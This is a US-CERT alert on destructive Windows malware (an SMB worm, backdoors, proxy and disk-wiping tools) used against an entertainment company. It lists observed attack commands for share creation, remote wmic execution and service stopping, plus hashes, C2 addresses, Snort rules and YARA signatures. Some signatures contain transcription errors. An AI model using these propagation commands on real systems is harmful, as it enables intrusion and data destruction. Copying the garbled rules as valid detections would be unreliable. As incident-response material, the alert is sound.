4139149552b0322f2c5c993abccc0f0d1b38db4476189a9f9901ac0d57a656be
64-bit Loader (Belgacom)
4d6cebe37861ace885aa00046e2769b500084cc79750d2bf8c1e290a1c42aaff
Photo credit: Winfried Rothermel/AP
Alert (TA14-353A)
Targeted Destructive Malware
Original release date: December 19, 2014
Systems Affected
Microsoft Windows
Overview
US-CERT was recently notified by a trusted third party of cyber threat actors using a Server Message Block (SMB) Worm Tool to conduct cyber exploitation
activities recently targeting a major entertainment company. This SMB Worm Tool is equipped with a Listening Implant, Lightweight Backdoor, Proxy Tool,
Destructive Hard Drive Tool, and Destructive Target Cleaning Tool.
SMB Worm Tool: This worm uses a brute force authentication attack to propagate via Windows SMB shares. It connects home every five minutes to send log data
back to command and control (C2) infrastructure if it has successfully spread to other Windows hosts via SMB port 445. The tool also accepts new scan tasking
when it connects to C2. There are two main threads: the first thread calls home and sends back logs (a list of successful SMB exploitations), and the second thread
attempts to guess passwords for SMB connections. If the password is correctly guessed, a file share is established and file is copied and run on the newly-infected
host.
Listening Implant: During installation of this tool, a portion of the binaries is decrypted using AES, with a key derived from the phrase "National Football League."
Additionally, this implant listens for connections on TCP port 195 (for "sensvc.exe" and "msensvc.exe") and TCP port 444 (for "netcfg.dll"). Each message sent to
and from this implant is preceded with its length, then XOR encoded with the byte 0x1F. Upon initial connection, the victim sends the string, "HTTP/1.1 GET /dns?
\x00." The controller then responds with the string "200 www.yahoo.com!\x00" (for "sensvc.exe" and "msensvc.exe") or with the string "RESPONSE 200 OK!!" (for
"netcfg.dll"). The controller sends the byte "!" (0x21) to end the network connection. This special message is not preceded with a length or XOR encoded.
Lightweight Backdoor: This is a backdoor listener that is designed as a service DLL. It includes functionality such as file transfer, system survey, process
manipulation, file time matching and proxy capability. The listener can also perform arbitrary code execution and execute commands on the command line. This
tool includes functionality to open ports in a victim host's firewall and take advantage of universal Plug and Play (UPNP) mechanisms to discover routers and
gateway devices, and add port mappings, allowing inbound connections to victim hosts on Network Address Translated (NAT) private networks. There are no
callback domains associated with this malware since connections are inbound only on a specified port number.
Proxy Tool: Implants in this malware family are typically loaded via a dropper installed as a service, then configured to listen on TCP port 443. The implant may
have an associated configuration file which can contain a configurable port. This proxy tool has basic backdoor functionality, including the ability to fingerprint the
victim machine, run remote commands, perform directory listings, perform process listings, and transfer files.
Destructive Hard Drive Tool: This tool is a tailored hard-drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim
machine
s recovery. If the CNE operator has administrator-level privileges on the host, the program will over-write portions of up-to the first four physical drives
attached, and over-write the master boot record (MBR) with a program designed to cause further damage if the hard drive is re-booted. This further results in the
victim machine being non-operational with irrecoverable data (There is a caveat for machines installed with the windows 7 operating system: windows 7 machines
will continue to operate in a degraded state with the targeted files destroyed until after reboot, in which the infected MBR then wipes the drive.) If the actor has
user-level access, the result includes specific files being deleted and practically irrecoverable, but the victim machine would remain usable.
Destructive Target Cleaning Tool: This tool renders victim machines inoperable by overwriting the Master Boot Record. The tool is dropped and installed by another
executable and consists of three parts: an executable and a dll which contain the destructive components, and an encoded command file that contains the actual
destruction commands to be executed.
Network Propagation Wiper: The malware has the ability to propagate throughout the target network via built-in Windows shares. Based on the
username/password provided in the configuration file and the hostname/IP address of target systems, the malware will access remote network shares in order to
upload a copy of the wiper and begin the wiping process on these remote systems. The malware uses several methods to access shares on the remote systems to
begin wiping files. Checking for existing shares via 
\\hostname\admin$\system32
 and 
\\hostname\shared$\system32
 or create a new share 
cmd.exe /q /c net
share shared$=%SystemRoot% /GRANT:everyone, FULL
. Once successful, the malware uploads a copy of the wiper file 
taskhostXX.exe
, changes the file-time
to match that of the built-in file 
calc.exe
, and starts the remote process. The remote process is started via the command 
cmd.exe /c wmic.exe /node:hostname
/user:username /password:pass PROCESS CALL CREATE
. Hostname, username, and password are then obtained from the configuration file. Afterwards, the
remote network share is removed via 
cmd.exe /q /c net share shared$ /delete
. Once the wiper has been uploaded, the malware reports its status back to one of
the four C2 IP addresses.
Technical and strategic mitigation recommendations are included in the Solution section below.
US-CERT recommends reviewing the Security Tip Handling Destructive Malware #ST13-003.
Description
Cyber threat actors are using an SMB worm to conduct cyber exploitation activities. This tool contains five components 
 a listening implant, lightweight backdoor,
proxy tool, destructive hard drive tool, and destructive target cleaning tool.
The SMB worm propagates throughout an infected network via brute-force authentication attacks, and connects to a C2 infrastructure.
Impact
Due to the highly destructive functionality of this malware, an organization infected could experience operational impacts including loss of intellectual property and
disruption of critical systems.
Solution
Users and administrators are recommended to take the following preventive measures to protect their computer networks:
      Use and maintain anti-virus software 
 Anti-virus software recognizes and protects your computer against most known viruses. It is important to keep your
      anti-virus software up-to-date (see Understanding Anti-Virus Software for more information).
      Keep your operating system and application software up-to-date 
 Install software patches so that attackers can't take advantage of known problems or
      vulnerabilities. Many operating systems offer automatic updates. If this option is available, you should enable it (see Understanding Patches for more
      information).
      Review Security Tip Handling Destructive Malware #ST13-003 and evaluate their capabilities encompassing planning, preparation, detection, and response
      for such an event.
      Review Recommended Practices for Control Systems, and Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies (pdf).
The following is a list of the Indicators of Compromise (IOCs) that can be added to network security solutions to determine whether they are present on a network.
MD5s:
SMB worm tool:
MD5: f6f48551d7723d87daeef2e840ae008f
Characterization: File Hash Watchlist
Notes: "SMB worm tool"
     Earliest PE compile Time: 20141001T072107Z
     Most Recent PE compile Time: 20141001T072107Z
MD5: 194ae075bf53aa4c83e175d4fa1b9d89
Characterization: File Hash Watchlist
Notes: "SMB worm tool"
     Earliest PE compile Time: 20141001T120954Z
     Most Recent PE compile Time: 20141001T142138Z
Lightweight backdoor:
MD5: f57e6156907dc0f6f4c9e2c5a792df48
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20110411T225224Z
     Latest PE compile time: 20110411T225224Z
MD5: 838e57492f632da79dcd5aa47b23f8a9
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20110517T050015Z
     Latest PE compile time: 20110605T204508Z
MD5: 11c9374cea03c3b2ca190b9a0fd2816b
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20110729T062417Z
     Latest PE compile time: 20110729T062958Z
MD5: 7fb0441a08690d4530d2275d4d7eb351
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20120128T071327Z
     Latest PE compile time: 20120128T071327Z
MD5: 7759c7d2c6d49c8b0591a3a7270a44da
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20120309T105837Z
     Latest PE compile time: 20120309T105837Z
MD5: 7e48d5ba6e6314c46550ad226f2b3c67
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20120311T090329Z
     Latest PE compile time: 20120311T090329Z
MD5: 0a87c6f29f34a09acecce7f516cc7fdb
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20120325T053138Z
     Latest PE compile time: 20130513T090422Z
MD5: 25fb1e131f282fa25a4b0dec6007a0ce
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20130802T054822Z
     Latest PE compile time: 20130802T054822Z
MD5: 9761dd113e7e6673b94ab4b3ad552086
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20130913T013016Z
     Latest PE compile time: 20130913T013016Z
MD5: c905a30badb458655009799b1274205c
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20140205T090906Z
     Latest PE compile time: 20140205T090906Z
MD5: 40adcd738c5bdc5e1cc3ab9a48b3df39
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20140320T152637Z
     Latest PE compile time: 20140402T023748Z
MD5: 68a26b8eaf2011f16a58e4554ea576a1
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20140321T014949Z
     Latest PE compile time: 20140321T014949Z
MD5: 74982cd1f3be3d0acfb0e6df22dbcd67
Characterization: File Hash Watchlist
Notes: "Lightweight backdoor"
     Earliest PE compile time: 20140506T020330Z
     Latest PE compile time: 20140506T020330Z
Proxy tool:
MD5: 734740b16053ccc555686814a93dfbeb
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time: 20140611T064905Z
     Latest PE compile time: 20140611T064905Z
MD5: 3b9da603992d8001c1322474aac25f87
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time: 20140617T035143Z
     Latest PE compile time: 20140617T035143Z
MD5: e509881b34a86a4e2b24449cf386af6a
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time : 20140618T064527Z
     Latest PE compile time: 20140618T064527Z
MD5: 9ab7f2bf638c9d911c2c742a574db89e
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time: 20140724T011233Z
     Latest PE compile time: 20140724T011233Z
MD5: a565e8c853b8325ad98f1fac9c40fb88
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time: 20140724T065031Z
     Latest PE compile time: 20140902T135050Z
MD5: 0bb82def661dd013a1866f779b455cf3
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time: 20140819T024812Z
     Latest PE compile time: 20140819T024812Z
MD5: b8ffff8b57586d24e1e65cd0b0ad9173
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time: 20140902T172442Z
     Latest PE compile time: 20140902T172442Z
MD5: 4ef0ad7ad4fe3ef4fb3db02cd82bface
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time: 20141024T134136Z
     Latest PE compile time: 20141024T134136Z
MD5: eb435e86604abced7c4a2b11c4637a52
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time: 20140526T010925Z
     Latest PE compile time: 20140526T010925Z
MD5: ed7a9c6d9fc664afe2de2dd165a9338c
Characterization: File Hash Watchlist
Notes: "Proxy tool"
     Earliest PE compile time: 20140611T064904Z
Destructive hard drive tool:
MD5: 8dec36d7f5e6cbd5e06775771351c54e
Characterization: File Hash Watchlist
Notes: "Destructive hard drive tool"
     Earliest PE compile time: 20120507T151820Z
     Latest PE compile time: 20120507T151820Z
MD5: a385900a36cad1c6a2022f31e8aca9f7
Characterization: File Hash Watchlist
Notes: "Destructive target cleaning tool"
     Earliest PE compile time: 20130318T003315Z
     Latest PE compile time: 20130318T003315Z
MD5: 7bea4323807f7e8cf53776e24cbd71f1
Characterization: File Hash Watchlist
Notes: "Destructive target cleaning tool"
     Earliest PE compile time: 20130318T003319Z
     Latest PE compile time: 20130318T003319Z
Name: d1c27ee7ce18675974edf42d4eea25c6.bin
Size: 268579 bytes (268.6 KB)
MD5: D1C27EE7CE18675974EDF42D4EEA25C6
PE Compile Time: 2014-11-22 00:06:54
The malware has the following characteristics:
While the original filename of this file is unknown, it was likely 
diskpartmg16.exe
. This file serves as a dropper. It drops destructive malware: 
igfxtrayex.exe
When the dropper file was executed, it started a second instance of itself with 
 as an argument, and then terminated. The second instance of the dropper file
installed itself as the 
WinsSchMgmt
 service with 
 as a command line argument, started the service, and then terminated. The 
WinsSchMgmt
 service
executed the file with 
 as an argument, which started another instance of the file using 
 as an argument. The 
 instance dropped and executed
igfxtrayex.exe
, created 
net_ver.dat
, and began generating network traffic over TCP ports 445 and 139 to victim IP addresses.
Name: net_ver.dat
Size: 4572 bytes (4.6 KB) (size will vary)
MD5: 93BC819011B2B3DA8487F964F29EB934 (hash will vary)
This is a log file created by the dropper, and appended to as the scans progress It contains what appear to be hostnames, IP addresses, and the number 2.
Entries in the file have the structure 
HOSTNAME | IP Address | 2
Name: igfxtrayex.exe
Size: 249856 bytes (249.9 KB)
MD5: 760C35A80D758F032D02CF4DB12D3E55
PE Compile Time: 2014-11-24 04:11:08
This file is destructive malware: a disk wiper with network beacon capabilities. If 
igfxtrayex.exe
 is run with no parameters, it creates and starts a copy of itself with
the 
 argument. After 10 minutes, the 
igfxtrayex.exe
 makes three copies of itself and places them in the same directory from which it was executed. These
copies are named according to the format 
taskhostXX.exe
 (where X is a randomly generated ASCII character). These copies are then executed, each with a
different argument (one being 
, one being 
 and the other 
). Network connection attempts are made to one of three hard-coded IP addresses in a random
order to port 8080 or 8000. If a connection to the IP address cannot be made, it attempts to connect to another of the three IP addresses, until connections to all
three IP addresses have been attempted. The following command-line string is then executed: 
cmd.exe /c net stop MSExchangeIS /y
. A 120-minute (2 hour)
sleep command is issued after which the computer is shut down and rebooted.
Name: iissvr.exe
Size: 114688 bytes (114.7 KB)
MD5: E1864A55D5CCB76AF4BF7A0AE16279BA
PE Compile Time: 2014-11-13 02:05:35
This file, when executed, starts a listener on localhost port 80. It has 3 files contained in the resource section; all xor
d with 0x63.
Name: usbdrv3_32bit.sys
Size: 24280 bytes (24.3 KB)
MD5: 6AEAC618E29980B69721158044C2E544
PE Compile Time: 2009-08-21 06:05:32
This SYS file is a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000, XP, 2003,
Vista, 2008 (32-bit). It is dropped from resource ID 0x81 of 
igfxtrayex.exe
Name: usbdrv3_64bit.sys
Size: 28120 bytes (28.1 KB)
MD5: 86E212B7FC20FC406C692400294073FF
PE Compile Time: 2009-08-21 06:05:35
This SYS file is a also a commercially available tool that allows read/write access to files and raw disk sectors for user mode applications in Windows 2000, XP,
2003, Vista, 2008 (64-bit). It is dropped from resource ID 0x83 of 
igfxtrayex.exe
Name: igfxtpers.exe
Size: 91888 bytes (91.9 KB)
MD5: e904bf93403c0fb08b9683a9e858c73e
PE Compile Time: 2014-07-07 08:01:09
A summary of the C2 IP addresses:
IP Address                                         Country                                   Port           Filename
203.131.222.102                                    Thailand                                  8080           Diskpartmg16.exe
                                                                                                            igfxtrayex.exe
                                                                                                            igfxtpers.exe
217.96.33.164                                      Poland                                    8000           Diskpartmg16.exe
                                                                                                            igfxtrayex.exe
88.53.215.64                                       Italy                                     8000           Diskpartmg16.exe
                                                                                                            igfxtrayex.exe
200.87.126.116                                     Bolivia                                   8000           File 7
58.185.154.99                                      Singapore                                 8080           File 7
212.31.102.100                                     Cypress                                   8080           File 7
208.105.226.235                                    United States                             --             igfxtpers.exe
Snort signatures:
SMB Worm Tool (not necessarily the tool itself):
alert tcp any any -> any any (msg:"Wiper1";content:"|be 64 ba f2 a8 64|";offset:16;depth:6;sid:1;)
alert tcp any any -> any any (msg:"Wiper2";content:"|c9 06 d9 96 fc 37 23 5a fe f9 40 ba 4c 94 14 98|";offset:0;depth:16;sid:3;)
alert tcp any any -> any any (msg:"Wiper3";content:"|aa 64 ba f2 56 9b|";offset:0;depth:50;sid:2;)
alert ip any any -> any any (msg:"Wiper4";content:"|aa 74 ba f2 b9 75|";offset:0;depth:74;sid:4;)
Listening Implant:
alert tcp any any -> any any (msg:"Backdoor1";content:"|0c 1f 1f 1f 4d 5a 4c 4f 50 51 4c 5a 3f 2d 2f 2f 3f 50 54 3e 3e 3e|";offset:0;depth:22;sid:9;)
alert tcp any any -> any any (msg:"Backdoor2";content:"|d3 c4 d2 d1 ce cf d2 c4 a1 b3 b1 b1 a1 ce ca a0 a0 a0|";offset:0;depth:18;sid:12;)
alert ip any any -> any any (msg:"Backdoor3";content:"|17 08 14 13 67 0f 13 13 17 67 15 02 16 12 02 14 13 78 47 47|";depth:24;sid:1;)
alert ip any any -> any any (msg:"Backdoor4";content:"|4f 50 4c 4b 3f 57 4b 4b 4f 3f 4d 5a 4e 4a 5a 4c 4b 20 1f|";depth:23;sid:2;)
alert ip any any -> any any (msg:"Backdoor5";content:"|15 02 14 17 08 09 14 02 67 75 77 77 67 08 0c 66 66 66|";depth:22;sid:3;)
alert tcp any any -> any any (msg:"Backdoor6";content:"|09 22 33 30 28 35 2c|";sid:4;)
alert tcp any any -> any any (msg:"Backdoor7";content:"|13 2f 22 35 22 67 26 35 22 29 27 33 67 28 37 22 29 67 37 28 35 33 34 69|";sid:5;)
alert tcp any any -> any any (msg:"Backdoor8";content:"|43 47 47 47 45 67 47 47 43 47 47 47 44 67 47 47|";sid:6;)
alert tcp any any -> any any (msg:"Backdoor9";content:"|43 47 47 47 42 67 47 47 43 47 47 47 4f 67 47 47 43 47 47 47 43 67 47 47 43 47 47 47 4e 67 47
47|";sid:7;)
alert tcp any any -> any any (msg:"Backdoor10";content:"|d1 ce d2 d5 a1 c9 d5 d5 d1 a1 d3 c4 d0 d4 c4 d2 d5 be|";offset:0;depth:18;sid:8;)
alert tcp any any -> any any (msg:"Backdoor11";content:"|17 08 14 13 67 0f 13 13 17 67 15 02 16 12 02 14 13 78|";offset:0;depth:18;sid:10;)
alert tcp any any -> any any (msg:"Backdoor12";content:"|0c 1f 1f 1f 4f 50 4c 4b 3f 57 4b 4b 4f 3f 4d 5a 4e 4a 5a 4c 4b 20|";sid:11;)
Lightweight Backdoor:
alert tcp any 488 <> any any (msg:"Proxy1";content:"|60 db 37 37 37 37 37 37|";sid:3;)
alert tcp any any -> any 488 (msg:"Proxy2";content:"|60 db 37 37 37 37 37 37|";sid:4;)
alert tcp any any -> any any (msg:"Proxy3";content:"|4c 4c|";offset:16;depth:2;content:"|75 14 2a 2a|";distance:4;within:4;sid:4;)
alert tcp any any -> any any (msg:"Proxy4";content:"|8A 10 80 C2 67 80 F2 24 88 10|";content:"8A 10 80 F2 24 80 EA 67 88 10";sid:2;)
alert tcp any 488 <> any any (msg:"Proxy5";content:"|65 db 37 37 37 37 37 37|";sid:2;)
alert tcp any any -> any 488 (msg:"Proxy6";content:"|65 db 37 37 37 37 37 37|";sid:2;)
alert tcp any [547,8080,133,117,189,159] -> any any (msg:"Proxy7";content:"|7b 08 2a 2a|";offset:17;content:"|08 2a 2a 01 00|";distance:0;sid:1;)
alert tcp any any -> any any (msg:"Proxy8";content:"|8A 10 80 EA 62 80 F2 B4 88 10|";content:"|8A 10 80 F2 B4 80 C2 62 88 10|";sid:1;)
alert tcp any any -> any any (msg:"Proxy9";content:"|8A 10 80 C2 4E 80 F2 79 88 10|";content:"|8A 10 80 F2 79 80 EA 4E 88 10[";sid:3;)
alert tcp any any -> any any (msg:"Proxy10";content:"Sleepy!@#qaz13402scvsde890";nocase;content:"BC435@PRO62384923412!@3!";nocase;sid:5;)
Proxy Tool:
alert tcp any any -> any any (msg:"Wiper1";content:"|8A 10 80 C2 3A 80 F2 73 88 10|";content:"|8A 10 80 F2 73 80 EA 3A 88 10|";sid:4;)
alert tcp any any -> any any (msg:"Wiper2";content:!"HTTP/1";content:"|e2 1d 49 49|";offset:O;depth:4;content:"|49 49 49 49|";distance:4;within:4;sid:6;)
alert tcp any any -> any any (msg:"Wiper3";content:"|82 F4 DE D4 D3 C2 CA F5 C8 C8 D3 82 FB F4 DE D4 D3 C2 CA 94 95 FB D4 D1 C4 CF C8 D4 D3 89 C2
DF C2 87 8A CC 87 00|";sid:1;)
Malware associated with the cyber threat actor:
alert tcp any any -> any [8000,8080] (msg:"WIPER4";flow: established, to_server;dsize:42;content:"|28 00|";depth:2;content:"|04 00 00
00|";offset:38;depth:4;sid:123;)
Host Based Indicators
Below are potential YARA signatures to detect malware binaries on host machines:
SMB Worm Tool:
strings:
$STR1 = "Global\\FwtSqmSession106829323_S-1-5-19"
$STR2 ="EVERYONE"
$STR3 = "y0uar3@s!llyid!07,ou74n60u7f001"
$STR4 = "\\KB25468.dat" condition:
(uintl6(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) ==0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
Lightweight Backdoor:
strings:
$STR1 = ''NetMgStart"
$STR2 = ''Netmgmt.srg"
condition:
(uint16(0) == 0x5A4D) and all of them
Lightweight Backdoor:
strings:
$STR1 = "prxTroy" ascii wide nocase
condition:
(uintl6(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
Lightweight Backdoor:
strings:
$strl = { C6 45 E8 64 C6 45 E9 61 C6 45 EA 79 C6 45 EB 69 C6 45 EC 70 C6 45 ED 6D C6 45 EE 72 C6 45 EF 2E C6 45 F0 74 C6 45 F1 62 C6 45 F2 6C } //
'dayipmr.tbl' being moved to ebp
condition:
(uintl6(0) == 0x5A4D or uintl6(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
Lightweight Backdoor:
strings:
$strl = { C6 45 F4 61 C6 45 F5 6E C6 45 F6 73 C6 45 F7 69 C6 45 F8 2E C6 45 F9 6E C6 45 FA 6C C6 45 FB 73 } // 'ansi.nls' being moved to ebp
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
Lightweight Backdoor:
strings:
$strl = { C6 45 F4 74 C6 45 F5 6C C6 45 F6 76 C6 45 F7 63 C6 45 F8 2E C6 45 F9 6E C6 45 FA 6C C6 45 FB 73 } // 'tlvc.nls' being moved to ebp
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
Lightweight Backdoor:
strings:
$STR1 = { 8A 10 80 ?? 4E 80 ?? 79 88 10}
$STR2 = {SA 10 80?? 79 80 ?? 4E 88 10}
condition:
(uintl6(0) == 0x5A4D or uintl6(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
Proxy Tool:
strings:
$STR1 = "pmsconfig.msi" wide
$STR2 = "pmslog.msi" wide
condition:
(uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them
Proxy Tool:
strings:
$STR1 = { 82 F4 DE D4 D3 C2 CA F5 C8 C8 D3 82 FB F4 DE D4 D3 C2 CA 94 95 FB D4 Dl C4 CF C8 D4 D3 89 C2 DF C2 87 8A CC 87 00 } //
'%SystemRoot%\System32\svchost.exe -k' xor A7
condition:
(uint16(0) == 0x5A4D or uintl6(0) == 0xCFD0 or uint16(0) == 0xC3D4 or
uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
Proxy Tool:
strings:
$STR2 = {8A 04 17 8B FB 34 A7 46 88 02 83 C9 FF}
condition:
(uintl6(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and $STR2
Destructive Hard Drive Tool:
strings:
$str0= "MZ"
$str1 = {c6 84 24 ?? ( 00 | 01 ) 00 00 }
$xorInLoop = { 83 EC 20 B9 08 00 00 00 33 D2 56 8B 74 24 30 57 8D 7C 24 08
F3 A5 8B 7C 24 30 85 FF 7E 3A 8B 74 24 2C 8A 44 24 08 53 8A 4C 24 21 8A 5C 24 2B 32 C1 8A 0C 32 32 C3 32 C8 88 0C 32 B9 1E 00 00 00 8A 5C 0C 0C 88
5C 0C 0D 49 83 F9 FF 7F F2 42 88 44 24 0C 3B D7 7C D0 5B 5F 5E 83 C4 20 C3 }
condition:
$str0 at 0 and $xorInLoop and #str1 > 300
Destructive Target Cleaning Tool:
strings:
$s1 = {d3000000 [4] 2c000000 [12] 95000000 [4] 6a000000 [8] 07000000}
condition:
(uintl6(0) == 0x5A4D and uintl6(uint32(0x3c)) == 0x4550) and all of them
Destructive Target Cleaning Tool:
strings
$secureWipe= { 83 EC 34 53 55 8B 6C 24 40 56 57 83 CE FF 55 C7 44 24 2C D3 00 00 00 C7 44 24 30 2C 00 00 00 89 74 24 34 89 74 24 38 C7 44 24 3C 95 00
00 00 C7 44 24 40 6A 00 00 00 89 74 24 44 C7 44 24 14 07 00 00 00 FF 15 ?? ?? ?? ?? 3B C6 89 44 24 1C OF 84 (D8 | d9) 01 00 00 33 FF 68 00 00 01 00 57 FF
15 ?? ?? ?? ?? 8B D8 3B DF 89 5C 24 14 OF 84 (BC | BD) 01 00 00 8B 44 24 1C A8 01 74 0A 24 FE 50 55 FF 15 ?? ?? ?? ?? 8B 44 24 4C 2B C7 74 20 48 74 0F
83 E8 02 75 1C C7 44 24 10 03 00 00 00 EB 12 C7 44 24 10 01 00 00 00 89 74 24 28 EB 04 89 7C 24 10 8B 44 24 10 89 7C 24 1C 3B C7 OF 8E ( 5C | 5d ) 01 00
00 8D 44 24 28 89 44 24 4C EB 03 83 CE FF 8B 4C 24 4C 8B 01 3B C6 74 17 8A D0 B9 00 40 00 00 8A F2 8B FB 8B C2 C1 E0 10 66 8B C2 F3 AB EB ( 13 | 14)
33 F6 (E8 | ff 15) ?? ?? ?? ?? 88 04 1E 46 81 FE 00 00 01 00 7C ( EF | ee) 6A 00 6A 00 6A 03 6A 00 6A 03 68 00 00 00 C0 55 FF 15 ?? ?? ?? ?? 8B F0 83 FE FF
OF 84 FA 00 00 00 8D 44 24 20 50 56 FF 15 ?? ?? ?? ?? 8B 2D ?? ?? ?? ?? 6A 02 6A 00 6A FF 56 FF D5 8D 4C 24 18 6A 00 51 6A 01 53 56 FF 15 ?? ?? ?? ??
56 FF 15 ?? ?? ?? ?? 6A 00 6A 00 6A 00 56 FF D5 8B 44 24 24 8B 54 24 20 33 FF 33 DB 85 CO 7C 5A 7F 0A 85 D2 76 54 EB 04 8B 54 24 20 8B CA BD 00 00
01 00 2B CF 1B C3 85 C0 7F 0A 7C 04 3B CD 73 04 2B D7 8B EA 8B 44 24 14 8D 54 24 18 6A 00 52 55 50 56 FF 15 ?? ?? ?? ?? 8B 6C 24 18 8B 44 24 24 03
FD 83 D3 00 3B D8 7C BE 7F 08 8B 54 24 20 3B FA 72 B8 8B 2D ?? ?? ?? ?? 8B 5C 24 10 8B 7C 24 1C 8D 4B FF 3B F9 75 17 56 FF 15 ?? ?? ?? ?? 6A 00 6A
00 6A 00 56 FF D5 56 FF 15 ?? ?? ?? ?? 56 FF 15 ?? ?? ?? ?? 56 FF 15 ?? ?? ?? ?? 8B 4C 24 4C 8B 6C 24 48 47 83 C1 04 3B FB 8B 5C 24 14 89 7C 24 1C 89
4C 24 4C 0F 8C ( AE | AD) FE FF FF 6A 00 55 E8 ?? ?? ?? ?? 83 C4 08 53 FF 15 ?? ?? ?? ?? 5F 5E 5D 5B 83 C4 34 C3}
condition:
$secureWipe
Destructive Target Cleaning Tool:
strings:
$S1_CMD_Arg = ""/install'"' fullword
$S2_CMD_Parse= ""\""%s'"' /install \""%s\""'"' fullword
$S3_CMD_Builder= ""\'"'%s\"" \""%s\'"' \""%s\'"' %s'"' fullword
condition:
all of them
Destructive Target Cleaning Tool:
strings:
$BATCH_SCRIPT_LN1_0 = ""goto x"" fullword
$BATCH_SCRIPT_LN1_1 = '"'del"" fullword
$BATCH_SCRIPT_LN2_0 = ""if exist"" fullword
$BATCH_SCRIPT_LN3_0 = "":x'"' fullword
$BATCH_SCRIPT_LN4_0 = ""zz%d.bat"'' fullword
condition:
(#BATCH_SCRIPT_LNl_l == 2) and all of them"
Destructive Target Cleaning Tool:
strings:
$MCU_DLL_ZLIB_COMPRESSED2=
{5CECABAE813CC9BCD5A542F454910428343479806F71D5521E2AOD}
condition:
$MCU_DLL_ZLIB_COMPRESSED2"
Destructive Target Cleaning Tool:
strings:
$MCU_INF_StartHexDec =
{010346080A30D63633000B6263750A5052322A00103D1B570A30E67F2A00130952690A50 3A0D2A000E00A26El5104556766572636C7669642E657865}
$MCU_INF_StartHexEnc =
{6C3272386958BF075230780A0A54676166024968790C7A6779588F5E47312739310163615B3D59686721CF5F2120263ElF5413531FlE004543544C55}
condition:
$MCU_INF_StartHexEnc or
$MCU_INF_StartHexDec
Destructive Target Cleaning Tool:
strings:
$ = "SetFilePointer"
$ = "SetEndOfFile"
$ = {75 17 56 ff 15 ?? ?? ?? ?? 6a 00 6a 00 6a 00 56 ffD5 56 ff 15?? ?? ??
?? 56}
condition:
(uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and all of them
Destructive Target Cleaning Tool:
strings:
$license=
{E903FFFF820050006F007200740069006F006E007300200063006F007000790072006900670068007400200052006F006200650072007400200064006500200042006100740068002C00
$PuTTY= {50007500540054005900}
condition:
(uint16(0) == 0x5A4D and uintl6(uint32(0x3c)) == 0x4550) and $license and not $PuTTY
Malware used by cyber threat actor:
strings:
$heapCreateFunction_0 = {33C06A003944240868001000000F94C050FF15????????85C0A3???????07436E893FEFFFF83F803A3???????
0750D68F8030000E8??00000059EB0A83F8027518E8????000085C0750FFF35???????0FF15???????033C0C36A0158C3}
$heapCreateFunction =
{558BECB82C120000E8????FFFF8D8568FFFFFF5350C78568FFFFFF94000000FF1????????
085C0741A83BD78FFFFFF02751183BD6CFFFFFF0572086A0158E9020100008D85D4EDFFF68901000005068???????0FF15???????
085C00F84D000000033DB8D8DD4EDFFFF389DD4EDFFFF74138A013C617C083C7A7F042C20880141381975ED8D85D4EDFFFF6A165068???????0E8????
000083C40C85C075088D85D4EDFFFFEB498D8564FEFFFF68040100005053FF15???????
0389D64FEFFFF8D8D64FEFFFF74138A013C617C083C7A7F042C20880141381975ED8D8564FEFFFF508D85D4EDFFFF50E8????????
59593BC3743E6A2C50E8????????593BC3597430408BC83818740E80393B75048819EB0141381975F26A0A5350E8????
000083C40C83F802741D83F803741883F80174138D45FC50E898FEFFFF807DFC06591BC083C0035BC9C3}
$getMajorMinorLinker =
{568B7424086A00832600FF15???????06681384D5A75148B483C85C9740D03C18A481A880E8A401B8846015EC3}
